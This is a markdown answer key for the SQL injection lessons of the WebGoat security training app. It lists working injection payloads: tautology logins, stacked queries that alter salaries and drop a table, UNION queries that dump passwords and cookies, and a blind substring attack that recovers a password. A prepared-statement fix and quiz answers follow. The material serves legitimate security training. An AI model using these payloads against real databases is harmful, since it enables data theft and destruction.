# Excercise A1 Solutions

I solved these excercises myself, or used a guide. These solutions work and are the official solutions, they can also be found here: https://github.com/WebGoat/WebGoat/wiki/(Almost)-Fully-Documented-Solution-(en)#a1-injection

### Intro

2: __SQL query:__ SELECT department FROM employees WHERE first_name='Bob' 

3: __SQL query:__ UPDATE employees SET department='Sales' WHERE first_name='Tobi'

4: __SQL query:__ ALTER TABLE employees ADD phone varchar(20) 

5: __SQL query:__ GRANT ALTER TABLE TO UnauthorizedUser

9: __SELECT * FROM users_data FIRST_NAME = 'John' and Last_NAME = '__ ' + or + '1'='1

10: __Login_count:__ 0    __User_Id:__ 0  __OR__  1=1

11: __Employee Name:__ A    __Authentication TAN:__ ' __OR__ '1' = '1

12: __Employee Name:__ A    __Authentication TAN:__ '; UPDATE employees SET salary=99999 WHERE first_name='John

13: __Action contains:__ %'; DROP TABLE access_log;--


### Advanced

3: __Name:__ '; SELECT * FROM user_system_data;-- __OR__ ' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--

5: Login page doesn't provide any useful outputs, but the Register page allows to check if a username already exists. Trying to register with the username __tom' AND '1'='1__ we find that the username is taken. We guess that the table we are seeking is named "password", and registering with the username __tom' AND substring(password,1,1)='t__ we find that the username is already taken. That means that Tom's password starts with the letter "t". By guessing forward one letter at a time, we find that Tom's password is __thisisasecretfortomonly__. 

6: 
__1.__ Solution 4: A statement has got values instead of a prepared statement

__2.__ Solution 3: ?

__3.__ Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.

__4.__ Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data

__5.__ Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.


### Mitigation

5. 
![1]

6.
> try {  
     Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);  
     PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE name = ?");  
     ps.setString(1, "Admin");  
     ps.executeUpdate();  
} catch (Exception e) {  
     System.out.println("Oops. Something went wrong!");  
}

10. I haven't solved it myself, good luck! You can find all the correct answers to WebGoat excercises also here: https://github.com/WebGoat/WebGoat/wiki/(Almost)-Fully-Documented-Solution-(en)

[1]: https://raw.githubusercontent.com/PiAil/pwning-webgoat/master/images/wiki_owasp_webgoat/sqli-mitigation-5.png
